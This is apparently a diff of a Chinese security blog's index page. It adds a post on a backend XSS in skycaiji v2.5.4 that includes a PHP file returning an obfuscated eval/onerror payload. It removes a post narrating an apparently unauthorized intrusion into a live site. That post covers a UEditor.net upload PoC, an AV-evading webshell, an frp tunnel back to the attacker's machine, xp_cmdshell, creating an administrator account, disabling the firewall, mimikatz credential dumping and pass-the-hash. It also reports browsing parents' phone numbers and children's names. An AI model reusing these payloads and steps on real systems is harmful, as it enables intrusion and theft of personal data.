@@ -255,6 +255,88 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/" class="post-title-link" itemprop="url">skycaiji-v2.5.4 has a backend xss vulnerability</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-05-02 23:40:05 / 修改时间：23:41:15" itemprop="dateCreated datePublished" datetime="2023-05-02T23:40:05+08:00">2023-05-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cve/" itemprop="url" rel="index"><span itemprop="name">-cve</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="skycaiji-v2-5-4-has-a-backend-xss-vulnerability"><a href="#skycaiji-v2-5-4-has-a-backend-xss-vulnerability" class="headerlink" title="skycaiji-v2.5.4 has a backend xss vulnerability"></a>skycaiji-v2.5.4 has a backend xss vulnerability</h1><p>Firstly, you can download the source code from the following website</p>
+<p><code>https://down.chinaz.com/api/index/download?id=38972&amp;type=code</code></p>
+<p>Directly place it in the root directory of the website, access the server IP, and follow the prompts to install</p>
+<p>After installation, log in to the backend.</p>
+<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/image-20230502232501330.png" alt="image-20230502232501330"></p>
+<p>Click to the above function point</p>
+<p>This is a JSON parsing function, but there is no complete xss protection in place.</p>
+<p>We can construct a file that returns the JSON format ourselves, then access it, and return it to the JSON format with xss to trigger the xss code in the background.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;John  &lt;img src=\&#x27;x\&#x27; onerror=\&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\&quot;&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;johndoe@example.com&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$json</span> = json_encode(<span class="variable">$data</span>);</span><br><span class="line"> </span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$json</span>;</span><br></pre></td></tr></table></figure>
+
+<p>This string of code will return a JSON data with malicious payload.</p>
+<p>We will deploy it on our own VPS and induce the backend administrator to parse its data, and we will find that the successful triggering of the xss code</p>
+<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/image-20230502232849580.png" alt="image-20230502232849580"></p>
+<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/image-20230502232855722.png" alt="image-20230502232855722"></p>
+<p>Attackers can use this vulnerability to do anything that JavaScript code can do</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/04/27/%E7%9B%91%E6%8E%A7hackone%E6%8A%A5%E5%91%8A%E6%9C%BA%E5%99%A8%E4%BA%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -511,182 +593,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">【实战】UEditor.net rce的一次渗透</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-04-20 21:56:59 / 修改时间：21:58:04" itemprop="dateCreated datePublished" datetime="2023-04-20T21:56:59+08:00">2023-04-20</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="【实战】UEditor-net-rce的一次渗透"><a href="#【实战】UEditor-net-rce的一次渗透" class="headerlink" title="【实战】UEditor.net rce的一次渗透"></a>【实战】UEditor.net rce的一次渗透</h1><h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><p>一次睡梦中梦到的站点</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173157156.png" alt="image-20230420173157156"></p>
-<p>拿到一个站点之后，随便点了点，测了一下sql注入，没反应。</p>
-<p>随后看到bp上的被动扫描发现UEditor.net rce</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173350089.png" alt="image-20230420173350089"></p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173411060.png" alt="image-20230420173411060"></p>
-<p>随后开始构造poc</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxx.com/scripts/ueditor/net/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>然后制作aspx马上传到服务器，开一个web服务，供目标机器访问。</p>
-<p>随后访问poc，输入aspx马的地址，</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173638555.png" alt="image-20230420173638555"></p>
-<p>上传成功但是，拼接路径之后发现文件已经被删除了。</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174241352.png" alt="image-20230420174241352"></p>
-<p>怀疑被杀毒软件删除了。故使用tide的aspx免杀马重新上传，上传成功</p>
-<p>这里需要注意的是aspx马的地址,需要使用如下方式绕过，使其上传解析为aspx</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/ueditor.jpg?.aspx</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174707602.png" alt="image-20230420174707602"></p>
-<p>上传成功，随机使用冰蝎链接</p>
-<p>成功链接</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174913465.png" alt="image-20230420174913465"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿下shell之后信息收集一波</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180654341.png" alt="image-20230420180654341"></p>
-<p>iis权限</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180710809.png" alt="image-20230420180710809"></p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180734154.png" alt="image-20230420180734154"></p>
-<p>win的系统</p>
-<p>tasklist发现存在阿里云的云盾</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180830085.png" alt="image-20230420180830085"></p>
-<p>尝试iis6提权脚本，未果，疑似被云盾查杀，土豆也尝试过，无果。</p>
-<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>随后一直困在提权里面，闲着无聊，翻了翻网站的配置文件</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194623841.png" alt="image-20230420194623841"></p>
-<p>一般这种asp的站，web.config里面的 <code>&lt;connectionStrings&gt;</code>节点里面会有数据库的账号密码，我们就去数据库里面看看。这个站用的是sqlserver，也就是mssql。之前看进程的时候看到的。</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194736099.png" alt="image-20230420194736099"></p>
-<p>确实发现了数据库账号密码，可惜不是sa权限的。</p>
-<p>用冰蝎自带的数据库管理工具链接上去</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194854895.png" alt="image-20230420194854895"></p>
-<p>链接成功</p>
-<p>连接确实是链接到了，但是看不到表里面的数据啊。按理说，既然是配置文件中的账号，那么不会出现账号权限不足的情况。但是确实表里面什么东西都看不到，不得不怀疑是冰蝎本身的问题，所以我决定上代理，然后用正常的数据库管理工具尝试一下。</p>
-<p>然后老办法，frp传上去</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的攻击机</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"># 启用加密，防止流量被拦截</span><br><span class="line">use_encryption = true</span><br><span class="line"># 启用压缩，提升流量转发速度</span><br><span class="line">use_compression = true</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
-
-<p>攻击机开启</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vps_ip</span><br><span class="line">server_port = 4444</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420200359745.png" alt="image-20230420200359745"></p>
-<p>成功建立连接，现在准备连接他的数据库。</p>
-<p>链接成功</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420200638004.png" alt="image-20230420200638004"></p>
-<p>确实是有数据的，只是冰蝎的工具有问题。</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201008346.png" alt="image-20230420201008346"></p>
-<p>发现大量的数据，各个家长的手机号码和孩子的名字。</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201620094.png" alt="image-20230420201620094"></p>
-<p>还有很多订单信息</p>
-<p>虽然我知道没有sa的权限，但是还是抱着试一试的态度,想试试MSSQL xp_cmdshell提权漏洞</p>
-<p><code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;</code></p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201317706.png" alt="image-20230420201317706"></p>
-<p>开启了xp_cmdshell</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201359026.png" alt="image-20230420201359026"></p>
-<p>执行却失败了。唉。</p>
-<p>我超，但是我尝试使用这个用户的密码登录sa账户，居然成功了！</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202053653.png" alt="image-20230420202053653"></p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202124643.png" alt="image-20230420202124643"></p>
-<p>打开xp_cmdshell</p>
-<p><code>exec master..xp_cmdshell &#39;whoami&#39;</code></p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202329456.png" alt="image-20230420202329456"></p>
-<p>成功来到sqlserver权限</p>
-<h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202646252.png" alt="image-20230420202646252"></p>
-<p>添加用户</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202708880.png" alt="image-20230420202708880"></p>
-<p>加到管理组去</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420203129525.png" alt="image-20230420203129525"></p>
-<p>成功添加到管理组了！！</p>
-<p>远程桌面链接成功！</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420203150864.png" alt="image-20230420203150864"></p>
-<p>然后手动关掉防火墙</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420204036644.png" alt="image-20230420204036644"></p>
-<p>传猕猴桃上去抓一下密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420204610088.png" alt="image-20230420204610088"></p>
-<p>准备hash传递登录administrator账户</p>
-<p>传递没成功，不过无所谓了。反正我们创建的账户已经有管理员权限了。</p>
-<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用netspy看看存活网断</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netspy.exe -x is //极速模式</span><br></pre></td></tr></table></figure>
-
-<p>发现竟然没有扫描到存活网段，也是，毕竟是云上的服务器。那就arp -a.</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420210326953.png" alt="image-20230420210326953"></p>
-<p>判断出存在b段172.29，上fscan一把嗦</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 172.29.x.x -h 172.29.1.1/16</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420210648416.png" alt="image-20230420210648416"></p>
-<p>结果也只扫到了自己捏。估计是真的没什么东西吧</p>
-<p>后面又重新hash传递了一下，换了个方法传递成功之后，准备上管理员的机器看看有没有什么运维本什么的。</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420213038176.png" alt="image-20230420213038176"></p>
-<p>随后登录我们刚刚创建的管理员账号上去，关掉这个策略限制</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420213258547.png" alt="image-20230420213258547"></p>
-<p>给他改成禁用。</p>
-<p>但是需要administrator注销重新登录才可以，我又不能直接重启，我怕把他web服务给整掉了</p>
-<p>确实也只有一台服务器</p>
-<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420215042417.png" alt="image-20230420215042417"></p>
-<p>暂时点到为止吧</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/12/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><span class="page-number current">13</span><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/14/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/12/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><span class="page-number current">13</span><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/14/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -754,7 +664,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
